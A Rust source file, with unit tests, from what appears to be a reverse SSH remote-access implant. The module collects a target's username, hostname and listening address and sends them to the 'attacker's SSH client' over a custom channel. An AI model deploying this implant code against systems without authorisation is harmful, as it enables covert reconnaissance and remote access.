//! Extra info channel — sends system information over a custom SSH channel.
//!
//! Used by reverse mode (Task 12) to send the current username, hostname, and
//! listening address back to the attacker's SSH client.  The wire format
//! matches Go's `gossh.Marshal`: each string is a 4-byte big-endian length
//! prefix followed by UTF-8 bytes.

/// Custom SSH channel type used for exchanging system info.
#[allow(dead_code)]
pub const INFO_CHANNEL_TYPE: &str = "rs-info";

/// Rejection message for the info channel (matches Undertow).
#[allow(dead_code)]
pub const INFO_REJECTION_MSG: &str = "th4nkz";

/// System information sent back to the attacker via SSH channel.
///
/// Matches Undertow's `ExtraInfo` struct for protocol compatibility.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ExtraInfo {
    /// Username of the current user on the target system.
    pub current_user: String,
    /// Hostname of the target system.
    pub hostname: String,
    /// Address the reverse-forwarded port is listening on.
    pub listening_address: String,
}

impl ExtraInfo {
    /// Gather native system information.
    ///
    /// - Unix: username from `nix::unistd`, hostname from `gethostname`
    /// - Windows: username from `%USERNAME%`, hostname from `%COMPUTERNAME%`
    /// - Falls back to `"ERROR"` on failure (matches Undertow behaviour).
    pub fn gather_native(listening_address: &str) -> Self {
        let current_user = Self::get_username();
        let hostname = Self::get_hostname();
        ExtraInfo {
            current_user,
            hostname,
            listening_address: listening_address.to_string(),
        }
    }

    #[cfg(unix)]
    fn get_username() -> String {
        nix::unistd::User::from_uid(nix::unistd::getuid())
            .ok()
            .flatten()
            .map(|u| u.name)
            .unwrap_or_else(|| "ERROR".to_string())
    }

    #[cfg(windows)]
    fn get_username() -> String {
        std::env::var("USERNAME").unwrap_or_else(|_| "ERROR".to_string())
    }

    #[cfg(unix)]
    fn get_hostname() -> String {
        nix::unistd::gethostname()
            .ok()
            .and_then(|h| h.into_string().ok())
            .unwrap_or_else(|| "ERROR".to_string())
    }

    #[cfg(windows)]
    fn get_hostname() -> String {
        std::env::var("COMPUTERNAME").unwrap_or_else(|_| "ERROR".to_string())
    }

    /// Serialize to SSH wire format.
    ///
    /// Each string is encoded as a 4-byte big-endian length followed by the
    /// UTF-8 bytes.  Three strings are concatenated in order: `current_user`,
    /// `hostname`, `listening_address`.
    pub fn to_ssh_bytes(&self) -> Vec<u8> {
        let mut buf = Vec::new();
        write_ssh_string(&mut buf, &self.current_user);
        write_ssh_string(&mut buf, &self.hostname);
        write_ssh_string(&mut buf, &self.listening_address);
        buf
    }

    /// Deserialize from SSH wire format.
    ///
    /// Returns `None` if the data is truncated or otherwise invalid.
    #[allow(dead_code)]
    pub fn from_ssh_bytes(data: &[u8]) -> Option<Self> {
        let mut cursor = 0;
        let current_user = read_ssh_string(data, &mut cursor)?;
        let hostname = read_ssh_string(data, &mut cursor)?;
        let listening_address = read_ssh_string(data, &mut cursor)?;
        Some(ExtraInfo {
            current_user,
            hostname,
            listening_address,
        })
    }
}

/// Write a length-prefixed SSH string into `buf`.
fn write_ssh_string(buf: &mut Vec<u8>, s: &str) {
    let bytes = s.as_bytes();
    buf.extend_from_slice(&(bytes.len() as u32).to_be_bytes());
    buf.extend_from_slice(bytes);
}

/// Read a length-prefixed SSH string from `data` at the given cursor position.
/// Advances the cursor past the string.  Returns `None` on truncation or
/// invalid UTF-8.
#[allow(dead_code)]
fn read_ssh_string(data: &[u8], cursor: &mut usize) -> Option<String> {
    if *cursor + 4 > data.len() {
        return None;
    }
    let len = u32::from_be_bytes(data[*cursor..*cursor + 4].try_into().ok()?) as usize;
    *cursor += 4;
    if *cursor + len > data.len() {
        return None;
    }
    let s = std::str::from_utf8(&data[*cursor..*cursor + len]).ok()?;
    *cursor += len;
    Some(s.to_string())
}

// ---------------------------------------------------------------------------
// Unit tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_ssh_bytes_roundtrip() {
        let info = ExtraInfo {
            current_user: "alice".to_string(),
            hostname: "workstation".to_string(),
            listening_address: "0.0.0.0:2222".to_string(),
        };
        let bytes = info.to_ssh_bytes();
        let decoded = ExtraInfo::from_ssh_bytes(&bytes).expect("should decode");
        assert_eq!(info, decoded);
    }

    #[test]
    fn test_ssh_bytes_format() {
        let info = ExtraInfo {
            current_user: "ab".to_string(),
            hostname: "cd".to_string(),
            listening_address: "ef".to_string(),
        };
        let bytes = info.to_ssh_bytes();

        // Each string: 4-byte BE length + bytes
        // "ab" -> [0,0,0,2, b'a', b'b']
        // "cd" -> [0,0,0,2, b'c', b'd']
        // "ef" -> [0,0,0,2, b'e', b'f']
        assert_eq!(bytes.len(), 3 * (4 + 2));

        // Check first string length prefix
        assert_eq!(&bytes[0..4], &[0, 0, 0, 2]);
        assert_eq!(&bytes[4..6], b"ab");

        // Check second string length prefix
        assert_eq!(&bytes[6..10], &[0, 0, 0, 2]);
        assert_eq!(&bytes[10..12], b"cd");

        // Check third string length prefix
        assert_eq!(&bytes[12..16], &[0, 0, 0, 2]);
        assert_eq!(&bytes[16..18], b"ef");
    }

    #[test]
    fn test_empty_strings() {
        let info = ExtraInfo {
            current_user: String::new(),
            hostname: String::new(),
            listening_address: String::new(),
        };
        let bytes = info.to_ssh_bytes();
        // Three empty strings: 3 * 4 bytes (length prefixes only)
        assert_eq!(bytes.len(), 12);
        assert_eq!(&bytes[0..4], &[0, 0, 0, 0]);
        assert_eq!(&bytes[4..8], &[0, 0, 0, 0]);
        assert_eq!(&bytes[8..12], &[0, 0, 0, 0]);

        let decoded = ExtraInfo::from_ssh_bytes(&bytes).expect("should decode");
        assert_eq!(info, decoded);
    }

    #[test]
    fn test_invalid_bytes() {
        // Empty data
        assert!(ExtraInfo::from_ssh_bytes(&[]).is_none());

        // Truncated length prefix (only 3 bytes)
        assert!(ExtraInfo::from_ssh_bytes(&[0, 0, 0]).is_none());

        // Length says 10 bytes but only 2 available
        assert!(ExtraInfo::from_ssh_bytes(&[0, 0, 0, 10, b'a', b'b']).is_none());

        // Only one complete string (missing second and third)
        let mut buf = Vec::new();
        write_ssh_string(&mut buf, "hello");
        assert!(ExtraInfo::from_ssh_bytes(&buf).is_none());

        // Two complete strings (missing third)
        write_ssh_string(&mut buf, "world");
        assert!(ExtraInfo::from_ssh_bytes(&buf).is_none());
    }
}
